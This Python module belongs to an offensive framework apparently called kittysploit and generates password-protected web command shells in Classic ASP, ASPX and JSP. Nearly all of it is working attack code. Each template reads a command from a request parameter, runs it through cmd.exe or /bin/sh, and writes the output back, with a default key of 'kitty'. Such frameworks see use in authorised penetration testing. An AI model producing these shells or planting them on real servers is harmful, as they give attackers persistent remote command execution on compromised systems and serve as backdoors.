from kittysploit import *


class Module(Payload):
	"""Web command shells for ASP/ASPX/JSP RCE chains."""

	__info__ = {
		"name": "Web Command Shell (ASP / ASPX / JSP)",
		"description": (
			"Generate a minimal web command shell for upload/write after web RCE. "
			"Pairs with listeners/web/php_* style interaction or generic HTTP. "
			"Default: password-protected cmd execution via GET/POST param."
		),
		"category": PayloadCategory.SINGLE,
		"arch": Arch.OTHER,
		"platform": Platform.MULTI,
		"listener": "listeners/web/php_post",
		"handler": Handler.REVERSE,
		"session_type": SessionType.WEBSHELL,
	}

	engine = OptString("aspx", "Engine: asp | aspx | jsp", True)
	password = OptString("kitty", "Password / auth token required in requests", True)
	param = OptString("cmd", "Parameter name for the command", False)

	def generate(self):
		engine = str(self.engine or "aspx").strip().lower()
		pwd = str(self.password or "kitty")
		param = str(self.param or "cmd")

		if engine == "asp":
			# Classic ASP
			return (
				f'<%\n'
				f'Dim p,c,s: p=Request("{param}"): If Request("key")<>"{pwd}" Then Response.End\n'
				f'If p<>"" Then\n'
				f'Set s=CreateObject("WScript.Shell").Exec("cmd /c "&p)\n'
				f'Response.Write(s.StdOut.ReadAll()&s.StdErr.ReadAll())\n'
				f'End If\n'
				f'%>\n'
			)

		if engine == "jsp":
			return (
				f'<%@ page import="java.io.*" %>\n'
				f'<%\n'
				f'String key=request.getParameter("key");\n'
				f'if(key==null||!"{pwd}".equals(key)){{out.print("denied");return;}}\n'
				f'String c=request.getParameter("{param}");\n'
				f'if(c!=null){{\n'
				f'Process p=Runtime.getRuntime().exec(new String[]{{"/bin/sh","-c",c}});\n'
				f'BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));\n'
				f'String l;while((l=br.readLine())!=null)out.println(l);\n'
				f'br=new BufferedReader(new InputStreamReader(p.getErrorStream()));\n'
				f'while((l=br.readLine())!=null)out.println(l);\n'
				f'}}\n'
				f'%>\n'
			)

		# aspx default (C#)
		return (
			f'<%@ Page Language="C#" %>\n'
			f'<%@ Import Namespace="System.Diagnostics" %>\n'
			f'<script runat="server">\n'
			f'void Page_Load(object s,EventArgs e){{\n'
			f'if(Request["key"]!="{pwd}"){{Response.End();return;}}\n'
			f'var c=Request["{param}"]; if(string.IsNullOrEmpty(c))return;\n'
			f'var p=new Process(); p.StartInfo.FileName="cmd.exe"; p.StartInfo.Arguments="/c "+c;\n'
			f'p.StartInfo.RedirectStandardOutput=true; p.StartInfo.RedirectStandardError=true;\n'
			f'p.StartInfo.UseShellExecute=false; p.StartInfo.CreateNoWindow=true; p.Start();\n'
			f'Response.Write(p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd());\n'
			f'}}\n'
			f'</script>\n'
		)
